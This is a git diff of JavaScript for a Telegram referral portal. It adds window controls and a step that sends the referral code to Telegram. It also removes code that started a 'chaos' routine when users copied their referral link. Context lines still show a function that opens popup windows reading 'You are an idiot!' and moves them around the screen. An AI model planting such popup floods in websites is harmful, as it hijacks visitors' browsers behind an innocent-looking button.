@@ -11,6 +11,10 @@ const submitUsername = document.getElementById('submitUsername');
 const telegramUsernameInput = document.getElementById('telegramUsername');
 const modalMessage = document.getElementById('modalMessage');
 const mainContent = document.querySelector('.main-content');
+const browserWindow = document.getElementById('browserWindow');
+const minimizeButton = document.querySelector('.control-button.minimize');
+const maximizeButton = document.querySelector('.control-button.maximize');
+const closeButton = document.querySelector('.control-button.close');
 
 // Handle Claim Button Click
 claimButton.addEventListener('click', () => {
@@ -50,7 +54,7 @@ submitUsername.addEventListener('click', async () => {
   submitUsername.textContent = 'Verifying...';
 
   try {
-    const response = await fetch(${backendUrl}/api/verify, {
+    const response = await fetch(`${backendUrl}/api/verify`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ telegramUsername }),
@@ -60,7 +64,9 @@ submitUsername.addEventListener('click', async () => {
 
     if (data.success) {
       closeModalFunc();
-      displayReferralSection(data.referralCode);
+      displaySuccessMessage();
+      // Send referral code via Telegram
+      sendReferralCodeToTelegram(data.telegramId, data.referralCode);
     } else {
       displayModalMessage(data.message || 'Verification failed. Please try again.', 'error');
     }
@@ -86,6 +92,7 @@ function openModal() {
   claimModal.style.display = 'block';
   telegramUsernameInput.value = '';
   modalMessage.textContent = '';
+  telegramUsernameInput.focus();
 }
 
 // Close Modal
@@ -93,70 +100,120 @@ function closeModalFunc() {
   claimModal.style.display = 'none';
 }
 
-// Display Referral Section
-function displayReferralSection(referralCode) {
-  mainContent.innerHTML = 
+// Display Success Message
+function displaySuccessMessage() {
+  mainContent.innerHTML = `
     <h1>Thank You for Verifying!</h1>
-    <div class="referral-section">
-      <p>Your referral code:</p>
-      <div class="referral-link">
-        <input type="text" id="referralLink" value="https://knckd.github.io/telegram-dpreferral-frontend/?referralCode=${referralCode}" readonly aria-label="Referral Link">
-        <button id="copyButton" class="copy-button">Copy</button>
-        <button id="chaosButton" class="chaos-button">Chaos</button>
-      </div>
-    </div>
-  ;
-
-  // Add event listeners for copy and chaos buttons
-  const copyButton = document.getElementById('copyButton');
-  const chaosButton = document.getElementById('chaosButton');
-  const referralLinkInput = document.getElementById('referralLink');
-
-  copyButton.addEventListener('click', () => {
-    navigator.clipboard.writeText(referralLinkInput.value)
-      .then(() => {
-        alert('Referral link copied to clipboard!');
-        // Start chaotic effects
-        startChaos();
-        // Notify the backend of chaos starting
-        notifyBackendOfChaos();
-      })
-      .catch((err) => {
-        console.error('Failed to copy:', err);
-        alert('Failed to copy the referral link. Please try manually.');
-      });
-  });
-
-  chaosButton.addEventListener('click', () => {
-    // Directly start chaos without copying
-    startChaos();
-    // Notify the backend of chaos starting
-    notifyBackendOfChaos();
-  });
+    <p>Your referral code has been sent to your Telegram.</p>
+  `;
 }
 
-// Notify backend about chaos initiation
-async function notifyBackendOfChaos() {
+// Send Referral Code to Telegram via Backend
+async function sendReferralCodeToTelegram(telegramId, referralCode) {
   try {
-    await fetch(${backendUrl}/api/startChaos, {
+    const response = await fetch(`${backendUrl}/api/sendReferral`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ message: 'Chaos started!' }),
+      body: JSON.stringify({ telegramId, referralCode }),
     });
-    console.log('Chaos event logged.');
+
+    const data = await response.json();
+
+    if (data.success) {
+      console.log('Referral code sent to Telegram.');
+    } else {
+      console.error('Failed to send referral code to Telegram:', data.message);
+    }
   } catch (error) {
-    console.error('Error logging chaos event:', error);
+    console.error('Error sending referral code to Telegram:', error);
   }
 }
 
-// Tab functionality - Fully functional links
-const tabButtons = document.querySelectorAll('.tab .tab-title');
+// Window Control Buttons Functionality
 
-tabButtons.forEach(button => {
-  button.addEventListener('click', (event) => {
-    // If the tab is an anchor link, it will navigate accordingly
-    // You can add additional functionality here if needed
-  });
+// Minimize Button
+minimizeButton.addEventListener('click', () => {
+  browserWindow.style.display = 'none';
+  createMinimizedBar();
+});
+
+// Maximize Button
+let isMaximized = false;
+maximizeButton.addEventListener('click', () => {
+  if (!isMaximized) {
+    browserWindow.style.width = '100%';
+    browserWindow.style.height = '100%';
+    browserWindow.style.top = '0';
+    browserWindow.style.left = '0';
+    browserWindow.style.transform = 'none';
+    isMaximized = true;
+    maximizeButton.textContent = '❐'; // Restore icon
+    maximizeButton.title = 'Restore';
+  } else {
+    browserWindow.style.width = '600px';
+    browserWindow.style.height = '600px';
+    browserWindow.style.top = '50%';
+    browserWindow.style.left = '50%';
+    browserWindow.style.transform = 'translate(-50%, -50%)';
+    isMaximized = false;
+    maximizeButton.textContent = '□'; // Maximize icon
+    maximizeButton.title = 'Maximize';
+  }
+});
+
+// Close Button
+closeButton.addEventListener('click', () => {
+  browserWindow.style.display = 'none';
+  removeMinimizedBar();
+});
+
+// Create Minimized Bar
+function createMinimizedBar() {
+  let minimizedBar = document.getElementById('minimizedBar');
+  if (!minimizedBar) {
+    minimizedBar = document.createElement('div');
+    minimizedBar.id = 'minimizedBar';
+    minimizedBar.className = 'minimized-bar';
+    minimizedBar.textContent = 'Telegram DP Referral Portal';
+    minimizedBar.addEventListener('click', () => {
+      browserWindow.style.display = 'flex';
+      minimizedBar.remove();
+    });
+    document.body.appendChild(minimizedBar);
+  }
+}
+
+// Remove Minimized Bar
+function removeMinimizedBar() {
+  const minimizedBar = document.getElementById('minimizedBar');
+  if (minimizedBar) {
+    minimizedBar.remove();
+  }
+}
+
+// Make the browser window draggable
+let isDragging = false;
+let offsetX, offsetY;
+
+const windowHeader = document.querySelector('.window-header');
+
+windowHeader.addEventListener('mousedown', (e) => {
+  isDragging = true;
+  offsetX = e.clientX - browserWindow.offsetLeft;
+  offsetY = e.clientY - browserWindow.offsetTop;
+  browserWindow.style.transition = 'none';
+});
+
+window.addEventListener('mousemove', (e) => {
+  if (isDragging && !isMaximized) {
+    browserWindow.style.left = `${e.clientX - offsetX}px`;
+    browserWindow.style.top = `${e.clientY - offsetY}px`;
+  }
+});
+
+window.addEventListener('mouseup', () => {
+  isDragging = false;
+  browserWindow.style.transition = 'all 0.3s ease';
 });
 
 // Function to start chaotic effects by duplicating browser windows
@@ -204,7 +261,7 @@ function createChaosWindow() {
   const chaosWindow = window.open('', '_blank', 'width=300,height=200');
 
   if (chaosWindow) {
-    chaosWindow.document.write(
+    chaosWindow.document.write(`
       <!DOCTYPE html>
       <html lang="en">
       <head>
@@ -245,7 +302,7 @@ function createChaosWindow() {
         <h1>You are an idiot!</h1>
       </body>
       </html>
-    );
+    `);
 
     // Move the window to a random position after a short delay
     setTimeout(() => {
